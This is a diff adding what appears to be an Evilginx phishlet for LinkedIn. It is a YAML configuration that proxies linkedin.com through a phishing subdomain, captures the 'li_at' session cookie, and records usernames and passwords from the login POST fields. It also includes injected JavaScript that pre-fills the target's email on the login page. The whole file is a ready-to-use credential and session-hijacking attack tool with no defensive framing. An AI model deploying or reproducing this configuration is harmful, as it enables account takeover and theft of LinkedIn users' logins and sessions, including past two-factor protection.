@@ -1,0 +1,42 @@
+name: 'LinkedIn'
+author: '@mrgretzky'
+min_ver: '3.0.0'
+redirect_url: 'https://www.linkedin.com/feed/'
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'linkedin.com', session: true, is_landing: true, auto_filter: true}
+sub_filters: []
+auth_tokens:
+  - domain: '.www.linkedin.com'
+    keys: ['li_at:always']
+    type: 'cookie'
+auth_urls:
+  - '/feed/'
+  - '/uas/authenticate'
+credentials:
+  username:
+    key: 'session_key'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'session_password'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'www.linkedin.com'
+  path: '/uas/login'
+js_inject:
+  - trigger_domains: ["www.linkedin.com"]
+    trigger_paths: ["/uas/login"]
+    trigger_params: ["email"]
+    script: |
+      function lp(){
+        var email = document.querySelector("#username");
+        var password = document.querySelector("#password");
+        if (email != null && password != null) {
+          email.value = "{email}";
+          password.focus();
+          return;
+        }
+        setTimeout(function(){lp();}, 100);
+      }
+      setTimeout(function(){lp();}, 100);
